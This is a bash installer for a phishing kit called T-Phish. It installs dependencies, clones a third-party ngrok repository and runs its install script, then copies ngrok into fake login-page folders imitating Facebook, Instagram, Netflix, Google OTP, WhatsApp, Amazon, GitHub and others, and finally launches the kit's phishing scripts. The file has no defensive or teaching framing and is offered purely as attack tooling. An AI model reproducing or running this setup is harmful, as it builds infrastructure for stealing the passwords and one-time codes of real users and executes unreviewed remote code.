#Installer
echo "Press 1 for Phone or Press 2 for PC"
read -r device
if [ $device == "1" ]; then
apt update
apt upgrade
apt install git
apt install php 
apt install wget
if [ ! -e "~/ngrok" ]; then
git clone https://github.com/NganDii/ngrokold
cd ngrok && bash Install.sh
fi
else
sudo apt update
sudo apt upgrade
sudo apt install git
sudo apt install php
sudo apt install wget
if [ ! -e "~/ngrok" ]; then
git clone https://github.com/NganDii/ngrokold
cd ngrok && bash Install.sh
fi
fi
cd $HOME
cd T-Phish
unzip T-Phish.zip
rm T-Phish.zip
cd ~/
cp -R ngrok ~/T-Phish/sites/facebook/
cp -R ngrok ~/T-Phish/sites/instagram/
cp -R ngrok ~/T-Phish/sites/Hotstar-otp-bypass/
cp -R ngrok ~/T-Phish/sites/facebook-group
cp -R ngrok ~/T-Phish/sites/Linkedin
cp -R ngrok ~/T-Phish/sites/facebook-photo
cp -R ngrok ~/T-Phish/sites/ipfinder
cp -R ngrok ~/T-Phish/sites/Netflix
cp -R ngrok ~/T-Phish/sites/facebook-verify
cp -R ngrok ~/T-Phish/sites/spotify
cp -R ngrok ~/T-Phish/sites/github
cp -R ngrok ~/T-Phish/sites/whatsapp-phishing
cp -R ngrok ~/T-Phish/sites/amazonsign
cp -R ngrok ~/T-Phish/sites/google-otp
cp -R ngrok ~/T-Phish/sites/instafollow
chmod +x start.sh
bash start.sh
chmod 7777 phish.sh
bash phish.sh
